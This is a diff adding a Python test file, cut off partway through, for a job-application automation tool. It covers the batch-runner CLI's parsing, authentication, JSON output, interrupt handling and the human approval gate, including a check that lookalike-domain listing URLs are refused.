@@ -1,0 +1,1618 @@
+"""Tests for the batch runner and the log exporter.
+
+The HTTP mode is exercised against the real control plane through
+`TestClient`, so "the CLI talks to the API" is proven rather than mocked;
+the local mode is exercised against the real `ApplicationWorker` with the
+same faked browser side. No socket is opened, no browser is launched, and
+nothing is submitted anywhere.
+"""
+
+from __future__ import annotations
+
+import asyncio
+import csv
+import io
+import json
+import os
+import sqlite3
+from contextlib import AbstractContextManager, nullcontext
+from pathlib import Path
+from typing import Any, Iterator, Sequence
+
+import httpx
+import pytest
+
+from app.agent.errors import ProfileLockedError
+from app.agent.graph import thread_id_for
+from app.config import Settings
+from app.main import ApplicationWorker
+from app.storage.models import (
+    ApplicationStatus,
+    ApprovalDecision,
+    Board,
+    FieldSource,
+    QueueState,
+)
+from scripts import export_log, run_batch
+from tests.api_support import (
+    LISTING_URL,
+    TOKEN,
+    Harness,
+    gap_world,
+    staged_application,
+)
+
+SECOND_LISTING = "https://www.linkedin.com/jobs/view/2/"
+
+
+def _csv_rows(text: str) -> list[dict[str, str]]:
+    """Parse an export as a CSV document, embedded newlines and all."""
+    return list(csv.DictReader(io.StringIO(text)))
+
+
+def worker_factory_for(harness: Harness, cls: type[ApplicationWorker]) -> Any:
+    """A local-mode worker factory that builds one particular subclass.
+
+    The subclasses are how a test makes a real worker fail at a chosen
+    moment — during `start()`, during `drain()`, during `stop()` — without
+    a browser being involved in either the failure or the recovery.
+    """
+
+    def factory(settings: Settings) -> ApplicationWorker:
+        worker = cls(
+            settings,
+            db=harness.world.db,
+            session_factory=harness.session_factory,
+            dependencies_factory=lambda _s, _d, _c: harness.world.deps,
+            checkpointer_path=harness.world.checkpoint_path,
+            run_loop=False,
+        )
+        harness.workers.append(worker)
+        return worker
+
+    return factory
+
+
+class Console:
+    """Collects what a command printed, for asserting on the output."""
+
+    def __init__(self, answers: list[str] | None = None) -> None:
+        self.lines: list[str] = []
+        self.answers = list(answers or [])
+
+    def write(self, line: str) -> None:
+        self.lines.append(str(line))
+
+    def read(self) -> str:
+        return self.answers.pop(0) if self.answers else ""
+
+    @property
+    def text(self) -> str:
+        return "\n".join(self.lines)
+
+    def json(self) -> Any:
+        return json.loads(self.text)
+
+
+@pytest.fixture
+def harness(tmp_path: Path) -> Harness:
+    return Harness(gap_world(tmp_path))
+
+
+@pytest.fixture
+def served(harness: Harness) -> Iterator[Harness]:
+    """The control plane, running, with a client factory pointed at it."""
+    with harness.client() as client:
+        harness.http = client  # type: ignore[attr-defined]
+        yield harness
+
+
+def run_cli(harness: Harness, *argv: str, console: Console | None = None) -> int:
+    """Drive the batch runner against this harness's running API."""
+    out = console or Console()
+
+    def client_factory(
+        api_url: str, token: str | None
+    ) -> AbstractContextManager[httpx.Client]:
+        # Borrowed, not owned: the running fixture closes this client, and
+        # a command that closed it would shut the server down mid-test.
+        return nullcontext(harness.http)  # type: ignore[attr-defined]
+
+    return run_batch.main(
+        list(argv),
+        settings=harness.settings,
+        client_factory=client_factory,
+        writer=out.write,
+        reader=out.read,
+    )
+
+
+class TestBatchParser:
+    """The parser refuses ambiguous or unsafe invocations before acting."""
+
+    def test_a_board_is_required_to_queue(self) -> None:
+        with pytest.raises(SystemExit) as excinfo:
+            run_batch.build_parser().parse_args(["queue", LISTING_URL])
+        assert excinfo.value.code == 2
+
+    def test_an_unknown_board_is_refused_by_the_parser(self) -> None:
+        with pytest.raises(SystemExit):
+            run_batch.build_parser().parse_args(
+                ["queue", LISTING_URL, "--board", "monster"]
+            )
+
+    def test_a_board_is_parsed_into_the_typed_enum(self) -> None:
+        args = run_batch.build_parser().parse_args(
+            ["queue", LISTING_URL, "--board", "linkedin"]
+        )
+        assert args.board is Board.LINKEDIN
+        assert args.urls == [LISTING_URL]
+
+    def test_local_and_an_explicit_api_are_mutually_exclusive(self) -> None:
+        """Naming both hides which one the command actually used."""
+        with pytest.raises(SystemExit):
+            run_batch.build_parser().parse_args(
+                ["--local", "--api", "http://127.0.0.1:9", "status", "1"]
+            )
+
+    def test_the_default_api_url_comes_from_settings(self) -> None:
+        settings = Settings(_env_file=None, api_host="127.0.0.1", api_port=9123)
+        assert run_batch.default_api_url(settings) == "http://127.0.0.1:9123"
+
+    def test_an_unspecified_host_is_addressed_as_loopback(self) -> None:
+        """0.0.0.0 is a bind address, not somewhere a client can connect."""
+        settings = Settings(_env_file=None, api_host="0.0.0.0", api_port=9123)
+        assert run_batch.default_api_url(settings) == "http://127.0.0.1:9123"
+
+    def test_no_subcommand_is_a_usage_error(self) -> None:
+        assert run_batch.main([], settings=Settings(_env_file=None)) == 2
+
+
+class TestHttpBatch:
+    def test_queueing_prints_the_accepted_listing(self, served: Harness) -> None:
+        console = Console()
+
+        code = run_cli(
+            served, "queue", LISTING_URL, "--board", "linkedin", console=console
+        )
+
+        assert code == 0
+        assert "queued" in console.text
+        assert [item.listing_url for item in served.db.list_queue_items()] == [
+            LISTING_URL
+        ]
+
+    def test_queueing_several_listings_queues_all_of_them(
+        self, served: Harness
+    ) -> None:
+        code = run_cli(
+            served, "queue", LISTING_URL, SECOND_LISTING, "--board", "linkedin"
+        )
+
+        assert code == 0
+        assert len(served.db.list_queue_items()) == 2
+
+    def test_json_output_is_machine_readable(self, served: Harness) -> None:
+        console = Console()
+
+        run_cli(
+            served,
+            "--json",
+            "queue",
+            LISTING_URL,
+            "--board",
+            "linkedin",
+            console=console,
+        )
+
+        payload = console.json()
+        assert payload[0]["listing_url"] == LISTING_URL
+        assert payload[0]["thread_id"] == thread_id_for(payload[0]["queue_id"])
+
+    def test_an_untrusted_url_is_reported_and_not_queued(
+        self, served: Harness
+    ) -> None:
+        console = Console()
+
+        code = run_cli(
+            served,
+            "queue",
+            "https://linkedin.com.evil.test/jobs/1",
+            "--board",
+            "linkedin",
+            console=console,
+        )
+
+        assert code == 1
+        assert "untrusted_listing_url" in console.text
+        assert served.db.list_queue_items() == []
+
+    def test_status_reports_a_pending_decision(self, served: Harness) -> None:
+        queue_id = served.db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        served.workers[0].wake()
+        application_id = staged_application(served, queue_id)
+        console = Console()
+
+        code = run_cli(served, "--json", "status", str(queue_id), console=console)
+
+        assert code == 0
+        body = console.json()
+        assert body["application"]["id"] == application_id
+        assert body["awaiting_decision"] is True
+
+    def test_status_for_an_unknown_run_is_reported_not_raised(
+        self, served: Harness
+    ) -> None:
+        console = Console()
+
+        code = run_cli(served, "status", "999", console=console)
+
+        assert code == 1
+        assert "unknown_queue_item" in console.text
+
+    def test_approving_over_http_submits(self, served: Harness) -> None:
+        queue_id = served.db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        served.workers[0].wake()
+        application_id = staged_application(served, queue_id)
+        console = Console()
+
+        code = run_cli(
+            served, "approve", str(application_id), "--note", "good fit", console=console
+        )
+
+        assert code == 0
+        assert "submitted" in console.text
+        approval = served.db.get_approval(application_id)
+        assert approval is not None
+        assert approval.decision is ApprovalDecision.APPROVED
+        assert approval.note == "good fit"
+        assert served.world.submitter.calls == 1
+
+    def test_rejecting_over_http_does_not_submit(self, served: Harness) -> None:
+        queue_id = served.db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        served.workers[0].wake()
+        application_id = staged_application(served, queue_id)
+
+        code = run_cli(served, "reject", str(application_id))
+
+        assert code == 0
+        assert served.world.submitter.calls == 0
+
+    def test_reversing_a_decision_is_reported_as_a_conflict(
+        self, served: Harness
+    ) -> None:
+        queue_id = served.db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        served.workers[0].wake()
+        application_id = staged_application(served, queue_id)
+        run_cli(served, "reject", str(application_id))
+        console = Console()
+
+        code = run_cli(served, "approve", str(application_id), console=console)
+
+        assert code == 1
+        assert "approval_conflict" in console.text
+
+    def test_pending_lists_only_applications_awaiting_a_decision(
+        self, served: Harness
+    ) -> None:
+        queue_id = served.db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        served.workers[0].wake()
+        application_id = staged_application(served, queue_id)
+        console = Console()
+
+        code = run_cli(served, "--json", "pending", console=console)
+
+        assert code == 0
+        assert [entry["application"]["id"] for entry in console.json()] == [
+            application_id
+        ]
+
+    def test_run_waits_for_each_listing_to_reach_a_decision_point(
+        self, served: Harness
+    ) -> None:
+        console = Console()
+
+        code = run_cli(
+            served,
+            "run",
+            LISTING_URL,
+            "--board",
+            "linkedin",
+            "--timeout",
+            "10",
+            console=console,
+        )
+
+        assert code == 0
+        assert "awaiting" in console.text
+        item = served.db.list_queue_items()[0]
+        record = served.db.get_application_by_thread(thread_id_for(item.id))
+        assert record is not None
+        assert record.status is ApplicationStatus.AWAITING_APPROVAL
+
+    def test_a_token_is_sent_when_one_is_configured(self, tmp_path: Path) -> None:
+        """The CLI must authenticate, or the server will refuse it."""
+        harness = Harness(gap_world(tmp_path), token=TOKEN)
+        seen: list[str | None] = []
+
+        with harness.client(headers={}) as raw:
+
+            def client_factory(
+                api_url: str, token: str | None
+            ) -> AbstractContextManager[httpx.Client]:
+                seen.append(token)
+                raw.headers["Authorization"] = f"Bearer {token}"
+                return nullcontext(raw)
+
+            code = run_batch.main(
+                ["queue", LISTING_URL, "--board", "linkedin"],
+                settings=harness.settings,
+                client_factory=client_factory,
+                writer=lambda line: None,
+            )
+
+        assert seen == [TOKEN]
+        assert code == 0
+
+    def test_a_refused_token_is_reported_rather_than_raised(
+        self, tmp_path: Path
+    ) -> None:
+        harness = Harness(gap_world(tmp_path), token=TOKEN)
+        console = Console()
+
+        with harness.client(headers={"Authorization": "Bearer wrong"}) as raw:
+            code = run_batch.main(
+                ["queue", LISTING_URL, "--board", "linkedin"],
+                settings=harness.settings,
+                client_factory=lambda api_url, token: nullcontext(raw),
+                writer=console.write,
+            )
+
+        assert code == 1
+        assert "invalid_credentials" in console.text
+
+    def test_an_unreachable_api_is_reported_as_a_connection_problem(
+        self, harness: Harness
+    ) -> None:
+        """No server is started here; the CLI must not traceback."""
+        console = Console()
+
+        def refusing(
+            api_url: str, token: str | None
+        ) -> AbstractContextManager[httpx.Client]:
+            def handler(request: httpx.Request) -> httpx.Response:
+                raise httpx.ConnectError("connection refused", request=request)
+
+            return httpx.Client(
+                base_url=api_url, transport=httpx.MockTransport(handler)
+            )
+
+        code = run_batch.main(
+            ["status", "1"],
+            settings=harness.settings,
+            client_factory=refusing,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert "could not reach" in console.text
+
+
+class TestJsonStdoutPurity:
+    """Under `--json`, stdout is the document — including when there is none.
+
+    The README promises `run_batch --json ... | jq` works. A refusal from
+    the control plane, or a control plane that is not there at all, used to
+    be written through the same writer as the answer, so the pipe received
+    a prose sentence where a JSON document was expected and `jq` failed on
+    input the operator never asked for.
+    """
+
+    def _unreachable(
+        self, api_url: str, token: str | None
+    ) -> AbstractContextManager[httpx.Client]:
+        def handler(request: httpx.Request) -> httpx.Response:
+            raise httpx.ConnectError("connection refused", request=request)
+
+        return httpx.Client(base_url=api_url, transport=httpx.MockTransport(handler))
+
+    def _refusing(
+        self, api_url: str, token: str | None
+    ) -> AbstractContextManager[httpx.Client]:
+        def handler(request: httpx.Request) -> httpx.Response:
+            return httpx.Response(
+                409,
+                json={"error": {"kind": "approval_conflict", "message": "already decided"}},
+            )
+
+        return httpx.Client(base_url=api_url, transport=httpx.MockTransport(handler))
+
+    def test_an_unreachable_api_leaves_stdout_empty_under_json(
+        self, harness: Harness, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        console = Console()
+
+        code = run_batch.main(
+            ["--json", "status", "1"],
+            settings=harness.settings,
+            client_factory=self._unreachable,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert console.lines == []
+        assert "could not reach" in capsys.readouterr().err
+
+    def test_a_refusal_leaves_stdout_empty_under_json(
+        self, harness: Harness, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        console = Console()
+
+        code = run_batch.main(
+            ["--json", "approve", "1"],
+            settings=harness.settings,
+            client_factory=self._refusing,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert console.lines == []
+        assert "approval_conflict" in capsys.readouterr().err
+
+    @pytest.mark.parametrize("factory_name", ["_unreachable", "_refusing"])
+    def test_without_json_the_operator_still_reads_it_on_stdout(
+        self, harness: Harness, factory_name: str
+    ) -> None:
+        """Routing to stderr must not silence the prose mode."""
+        console = Console()
+
+        code = run_batch.main(
+            ["status", "1"],
+            settings=harness.settings,
+            client_factory=getattr(self, factory_name),
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert console.lines != []
+
+
+class TestWatching:
+    """`run` waits for each listing, and says so when it gave up waiting."""
+
+    def test_a_run_that_never_reaches_a_decision_exits_nonzero(
+        self, harness: Harness
+    ) -> None:
+        """Exit 0 means "this went as asked", and a timeout did not.
+
+        The listing is still being worked on server-side, so the report is
+        the truth about a slow run rather than an error — but a script that
+        queued fifty listings and moved on must not read "still staging" as
+        "ready for you".
+        """
+        harness.run_loop = False  # a control plane that accepts and never drains
+        console = Console()
+
+        with harness.client() as client:
+            harness.http = client  # type: ignore[attr-defined]
+            code = run_cli(
+                harness,
+                "run",
+                LISTING_URL,
+                "--board",
+                "linkedin",
+                "--timeout",
+                "0",
+                console=console,
+            )
+
+        assert code == 1
+        assert "had not reached a decision" in console.text
+        assert "run 1" in console.text
+
+    def test_a_run_that_reaches_the_gate_exits_zero(self, served: Harness) -> None:
+        code = run_cli(served, "run", LISTING_URL, "--board", "linkedin")
+        assert code == 0
+
+    def test_json_output_stays_parseable_when_a_run_times_out(
+        self, harness: Harness
+    ) -> None:
+        """The note about the timeout must not land in the JSON document."""
+        harness.run_loop = False
+        console = Console()
+
+        with harness.client() as client:
+            harness.http = client  # type: ignore[attr-defined]
+            code = run_cli(
+                harness,
+                "--json",
+                "run",
+                LISTING_URL,
+                "--board",
+                "linkedin",
+                "--timeout",
+                "0",
+                console=console,
+            )
+
+        assert code == 1
+        assert console.json()[0]["state"] == "pending"
+
+
+class TestInterrupting:
+    """Ctrl-C is the commonest way a local run ends, not an exotic one.
+
+    A batch is a browser, a profile lock, and a wait long enough that
+    people interrupt it. `KeyboardInterrupt` and `CancelledError` derive
+    from `BaseException`, not `Exception`, so every `except Exception`
+    around startup and draining let them past without stopping the worker:
+    the lock file stayed behind and the next run — local or served —
+    refused to start, naming a pid that no longer existed.
+    """
+
+    def _run(
+        self,
+        harness: Harness,
+        cls: type[ApplicationWorker],
+        console: Console,
+        *extra: str,
+    ) -> int:
+        return run_batch.main(
+            ["--local", *extra, "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=worker_factory_for(harness, cls),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+    @pytest.mark.parametrize("interrupt", [KeyboardInterrupt, asyncio.CancelledError])
+    def test_an_interrupt_during_startup_still_closes_the_browser(
+        self, harness: Harness, interrupt: type[BaseException]
+    ) -> None:
+        class Interrupted(ApplicationWorker):
+            async def start(self) -> None:
+                await super().start()
+                raise interrupt()
+
+        with pytest.raises(interrupt):
+            self._run(harness, Interrupted, Console())
+
+        assert harness.sessions[0].closes == 1
+
+    @pytest.mark.parametrize("interrupt", [KeyboardInterrupt, asyncio.CancelledError])
+    def test_an_interrupt_during_the_batch_still_closes_the_browser(
+        self, harness: Harness, interrupt: type[BaseException]
+    ) -> None:
+        class Interrupted(ApplicationWorker):
+            async def drain(self) -> list[Any]:
+                raise interrupt()
+
+        with pytest.raises(interrupt):
+            self._run(harness, Interrupted, Console())
+
+        assert harness.sessions[0].closes == 1
+
+    def test_an_interrupt_is_re_raised_rather_than_becoming_an_exit_code(
+        self, harness: Harness
+    ) -> None:
+        """Ctrl-C is not a failed batch; it is the operator taking over.
+
+        Swallowing it into a return code would leave the caller — a shell
+        script, or a `finally` further up — unable to tell an interrupted
+        run from one that simply failed.
+        """
+
+        class Interrupted(ApplicationWorker):
+            async def drain(self) -> list[Any]:
+                raise KeyboardInterrupt()
+
+        with pytest.raises(KeyboardInterrupt):
+            self._run(harness, Interrupted, Console())
+
+    def test_a_teardown_failure_does_not_replace_the_interrupt(
+        self, harness: Harness
+    ) -> None:
+        """The original exception is the one the operator caused."""
+
+        class Interrupted(ApplicationWorker):
+            async def drain(self) -> list[Any]:
+                raise KeyboardInterrupt()
+
+            async def stop(self) -> None:
+                await super().stop()
+                raise RuntimeError("the profile lock could not be released")
+
+        console = Console()
+
+        with pytest.raises(KeyboardInterrupt):
+            self._run(harness, Interrupted, console)
+
+        assert harness.sessions[0].closes == 1
+        assert "could not be shut down cleanly" in console.text
+
+    def test_a_second_interrupt_during_teardown_does_not_replace_the_first(
+        self, harness: Harness
+    ) -> None:
+        """Ctrl-C twice is what an impatient operator does.
+
+        The second one arriving mid-teardown must not be what propagates:
+        the run is already unwinding, and swapping the exception would lose
+        the reason it started.
+        """
+
+        class Interrupted(ApplicationWorker):
+            async def drain(self) -> list[Any]:
+                raise KeyboardInterrupt("the first one")
+
+            async def stop(self) -> None:
+                await super().stop()
+                raise KeyboardInterrupt("the second one")
+
+        with pytest.raises(KeyboardInterrupt, match="the first one"):
+            self._run(harness, Interrupted, Console())
+
+    def test_the_entry_point_turns_an_interrupt_into_the_usual_exit_code(
+        self,
+    ) -> None:
+        """130 and silence is what a shell expects of an interrupted command.
+
+        Re-raising is right inside `main`, where a caller may want to
+        distinguish it; at the process boundary it would only be a
+        traceback nobody reads.
+        """
+
+        def interrupted(argv: Sequence[str] | None) -> int:
+            raise KeyboardInterrupt()
+
+        assert run_batch.run(entry=interrupted) == 130
+
+    def test_the_entry_point_passes_an_ordinary_exit_code_through(self) -> None:
+        assert run_batch.run(entry=lambda argv: 2) == 2
+
+
+class TestLocalBatch:
+    """`--local` runs an in-process worker instead of talking to a server."""
+
+    def test_local_json_output_is_machine_readable(self, harness: Harness) -> None:
+        """`--json` was accepted and then ignored, which is the worst of both.
+
+        Parsed as a whole rather than by its last line: a document is only
+        machine-readable if everything on stdout is the document.
+        """
+        console = Console()
+
+        code = run_batch.main(
+            ["--local", "--json", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 0
+        payload = console.json()
+        assert payload[0]["queue_id"] == 1
+        assert payload[0]["status"] == "awaiting_approval"
+        assert payload[0]["awaiting_decision"] is True
+        assert payload[0]["thread_id"] == thread_id_for(1)
+
+    def test_local_json_output_carries_no_answer_text(
+        self, harness: Harness
+    ) -> None:
+        """The gate payload belongs to `GET /runs/{id}`, which redacts it."""
+        console = Console()
+
+        run_batch.main(
+            ["--local", "--json", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        payload = console.json()
+        assert "interrupt" not in payload[0]
+        assert "gaps" not in payload[0]
+
+    def test_an_untrusted_url_is_reported_and_not_queued(
+        self, harness: Harness
+    ) -> None:
+        """A local run must refuse the same URLs the API refuses.
+
+        `POST /queue` checks `require_trusted_host` before writing a row;
+        `--local run` used to skip straight to `enqueue_job`, so the same
+        lookalike-domain URL that the API turns away at 422 would instead
+        occupy a queue row and wait for a worker's attention here — the one
+        difference between the two front ends this project does not want.
+        """
+        console = Console()
+
+        code = run_batch.main(
+            [
+                "--local",
+                "run",
+                "https://linkedin.com.evil.test/jobs/1",
+                "--board",
+                "linkedin",
+            ],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert "untrusted_listing_url" in console.text
+        assert harness.world.db.list_queue_items() == []
+
+
+class TestLocalJsonStaysMachineReadable:
+    """Under `--json`, stdout is the document and nothing else.
+
+    A local run narrates: what it queued, what failed, what it asked at
+    the gate. Every one of those lines went to stdout alongside the JSON,
+    so `run_batch --local --json ... | jq` failed on the first listing —
+    and the more interesting the run, the more prose there was to break
+    it. Diagnostics belong on stderr, where a human still sees them and a
+    pipe does not.
+    """
+
+    def _run(
+        self,
+        harness: Harness,
+        console: Console,
+        *extra: str,
+        cls: type[ApplicationWorker] | None = None,
+        answers: list[str] | None = None,
+    ) -> int:
+        factory = (
+            worker_factory_for(harness, cls)
+            if cls is not None
+            else (lambda settings: harness.build_worker(run_loop=False))
+        )
+        return run_batch.main(
+            ["--local", "--json", "run", LISTING_URL, "--board", "linkedin", *extra],
+            settings=harness.settings,
+            worker_factory=factory,
+            client_factory=_no_http,
+            writer=console.write,
+            reader=console.read,
+        )
+
+    def test_what_was_queued_is_not_on_stdout(
+        self, harness: Harness, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        console = Console()
+
+        code = self._run(harness, console)
+
+        assert code == 0
+        assert console.json()[0]["queue_id"] == 1
+        assert "queued" not in console.text
+        assert "queued" in capsys.readouterr().err
+
+    def test_a_failed_batch_puts_no_prose_on_stdout(
+        self, harness: Harness, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        class Broken(ApplicationWorker):
+            async def drain(self) -> list[Any]:
+                raise RuntimeError("the graph fell over")
+
+        console = Console()
+
+        code = self._run(harness, console, cls=Broken)
+
+        assert code == 1
+        assert console.text == ""
+        assert "the graph fell over" in capsys.readouterr().err
+
+    def test_a_failed_startup_puts_no_prose_on_stdout(
+        self, harness: Harness, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        class Locked(ApplicationWorker):
+            async def start(self) -> None:
+                raise ProfileLockedError(
+                    Path("/tmp/profile/.job-apply-lock.json"), None, False
+                )
+
+        console = Console()
+
+        code = self._run(harness, console, cls=Locked)
+
+        assert code == 1
+        assert console.text == ""
+        assert ".job-apply-lock.json" in capsys.readouterr().err
+
+    def test_a_teardown_failure_puts_no_prose_on_stdout(
+        self, harness: Harness, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        class Sticky(ApplicationWorker):
+            async def stop(self) -> None:
+                await super().stop()
+                raise RuntimeError("the profile lock could not be released")
+
+        console = Console()
+
+        code = self._run(harness, console, cls=Sticky)
+
+        assert code == 1
+        console.json()  # still exactly one document: the batch itself ran
+        assert "could not be shut down cleanly" in capsys.readouterr().err
+
+    def test_the_gate_asks_on_stderr_and_answers_on_stdout(
+        self, harness: Harness, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        """A prompt is for the human; the document is for the pipe."""
+        console = Console(answers=["approve", "looks right"])
+
+        code = self._run(harness, console, "--prompt", "--actor", "ada")
+
+        assert code == 0
+        assert console.json()[0]["decision"] == "approved"
+        assert "approve" in capsys.readouterr().err.lower()
+
+    def test_prose_mode_still_narrates(self, harness: Harness) -> None:
+        """Guard: routing to stderr must not silence the ordinary run."""
+        console = Console()
+
+        run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert "queued" in console.text
+
+    @pytest.mark.parametrize(
+        "argv",
+        [
+            ["--local", "approve", "1"],
+            ["--local", "reject", "1"],
+            ["--local", "status", "1"],
+            ["--local", "pending"],
+        ],
+    )
+    def test_only_a_batch_can_be_run_locally(
+        self, harness: Harness, argv: list[str]
+    ) -> None:
+        """A decision needs the process holding the staged tab.
+
+        `--local` starts a worker for one batch and stops it again, so by
+        the time a second command could run there is no tab to submit and
+        no worker to submit it. Accepting these would mean approving an
+        application against a browser that closed — and the honest failure
+        for that is `PageUnavailable` a long way from the mistake.
+        """
+        console = Console()
+
+        code = run_batch.main(
+            argv,
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 2
+        assert "needs the control plane" in console.text
+        assert harness.sessions == []
+
+    def test_prompting_over_http_is_refused_rather_than_ignored(
+        self, harness: Harness
+    ) -> None:
+        """A console prompt cannot decide a tab in the server's process.
+
+        Ignoring `--prompt` here would be worse than refusing it: the
+        operator asked to be consulted about each application, would be
+        shown nothing, and would reasonably read the silent success as
+        "there was nothing to decide".
+        """
+        console = Console()
+
+        code = run_batch.main(
+            ["run", LISTING_URL, "--board", "linkedin", "--prompt"],
+            settings=harness.settings,
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 2
+        assert "--prompt needs --local" in console.text
+        assert harness.db.list_queue_items() == []
+
+    def test_local_queues_and_stages_without_a_server(
+        self, harness: Harness
+    ) -> None:
+        console = Console()
+
+        code = run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 0
+        assert "awaiting" in console.text
+        item = harness.db.list_queue_items()[0]
+        record = harness.db.get_application_by_thread(thread_id_for(item.id))
+        assert record is not None
+        assert record.status is ApplicationStatus.AWAITING_APPROVAL
+        assert harness.sessions[0].starts == 1
+        assert harness.sessions[0].closes == 1
+
+    def test_local_processes_every_queued_listing(self, harness: Harness) -> None:
+        code = run_batch.main(
+            ["--local", "run", LISTING_URL, SECOND_LISTING, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=lambda line: None,
+        )
+
+        assert code == 0
+        assert [item.state for item in harness.db.list_queue_items()] == [
+            QueueState.RUNNING,
+            QueueState.RUNNING,
+        ]
+
+    def test_local_also_drains_what_was_already_queued(
+        self, harness: Harness
+    ) -> None:
+        harness.db.enqueue_job(SECOND_LISTING, Board.LINKEDIN)
+
+        run_batch.main(
+            ["--local", "run"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=lambda line: None,
+        )
+
+        record = harness.db.get_application_by_thread(thread_id_for(1))
+        assert record is not None
+        assert record.status is ApplicationStatus.AWAITING_APPROVAL
+
+    def test_local_prompting_approves_through_the_shared_gate(
+        self, harness: Harness
+    ) -> None:
+        console = Console(answers=["approve", "looks right"])
+
+        code = run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin", "--prompt"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+            reader=console.read,
+        )
+
+        assert code == 0
+        assert harness.world.submitter.calls == 1
+        record = harness.db.get_application_by_thread(thread_id_for(1))
+        assert record is not None
+        assert record.status is ApplicationStatus.SUBMITTED
+        approval = harness.db.get_approval(record.id)
+        assert approval is not None
+        assert approval.note == "looks right"
+
+    def test_local_prompting_can_reject(self, harness: Harness) -> None:
+        console = Console(answers=["reject", ""])
+
+        run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin", "--prompt"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+            reader=console.read,
+        )
+
+        assert harness.world.submitter.calls == 0
+        record = harness.db.get_application_by_thread(thread_id_for(1))
+        assert record is not None
+        assert record.status is ApplicationStatus.REJECTED
+
+    def test_without_prompting_nothing_is_decided(self, harness: Harness) -> None:
+        """The default local run stops at the gate, like every other path."""
+        run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=lambda line: None,
+        )
+
+        record = harness.db.get_application_by_thread(thread_id_for(1))
+        assert record is not None
+        assert harness.db.get_approval(record.id) is None
+
+    def test_the_local_actor_names_the_operator_account(
+        self, harness: Harness
+    ) -> None:
+        console = Console(answers=["approve", ""])
+
+        run_batch.main(
+            [
+                "--local",
+                "run",
+                LISTING_URL,
+                "--board",
+                "linkedin",
+                "--prompt",
+                "--actor",
+                "ada@example.com",
+            ],
+            settings=harness.settings,
+            worker_factory=lambda settings: harness.build_worker(run_loop=False),
+            client_factory=_no_http,
+            writer=console.write,
+            reader=console.read,
+        )
+
+        record = harness.db.get_application_by_thread(thread_id_for(1))
+        assert record is not None
+        approval = harness.db.get_approval(record.id)
+        assert approval is not None
+        assert approval.actor == "ada@example.com"
+
+    def _worker_factory(
+        self, harness: Harness, cls: type[ApplicationWorker]
+    ) -> Any:
+        return worker_factory_for(harness, cls)
+
+    def test_a_startup_that_fails_halfway_still_closes_the_browser(
+        self, harness: Harness
+    ) -> None:
+        """`start()` opens the browser before it can fail.
+
+        A start that raises after the session is up has a real Chrome and a
+        real profile lock behind it. Left there, the lock outlives the
+        process and every later run — served or local — refuses to start at
+        all, with a message about a lock whose owner is gone.
+        """
+
+        class BrokenWorker(ApplicationWorker):
+            async def start(self) -> None:
+                await super().start()
+                raise RuntimeError("the checkpointer could not be opened")
+
+        console = Console()
+
+        code = run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
+            settings=harness.settings,
+            worker_factory=self._worker_factory(harness, BrokenWorker),
+            client_factory=_no_http,
+            writer=console.write,
+        )
+
+        assert code == 1
+        assert harness.sessions[0].starts == 1
+        assert harness.sessions[0].closes == 1
+        assert "could not be started" in console.text
+
+    def test_a_locked_profile_is_reported_rather_than_raised(
+        self, harness: Harness
+    ) -> None:
+        """The commonest startup failure, and the one with a real remedy.
+
+        An operator who left the control plane running, or whose last run
+        was killed, should read the sentence the error was written to say —
+        not a traceback ending in `ProfileLockedError`.
+        """
+        locked = ProfileLockedError(Path("/tmp/profile/.job-apply-lock.json"), None, False)
+
+        class LockedWorker(ApplicationWorker):
+            async def start(self) -> None:
+                raise locked
+
+        console = Console()
+
+        code = run_batch.main(
+            ["--local", "run", LISTING_URL, "--board", "linkedin"],
